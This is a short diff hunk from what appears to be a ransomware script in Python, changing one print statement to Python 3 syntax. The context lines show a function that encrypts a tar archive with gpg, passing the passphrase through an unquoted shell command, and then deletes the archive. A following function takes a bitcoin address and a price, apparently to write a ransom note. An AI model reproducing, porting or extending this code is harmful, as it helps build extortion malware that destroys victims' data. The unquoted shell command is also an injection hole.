@@ -48,7 +48,7 @@ def crypt(directory, pwd):
 			os.system('echo ' + pwd + ' | gpg --passphrase-fd 0 -c encrypted.tar')
                         os.system('rm encrypted.tar')
                         os.chdir('../')
-                        print "------------------- " 
+                        print ("------------------- ")
 
 def howto(directory, bitcoin, price):
     txt = "\n"
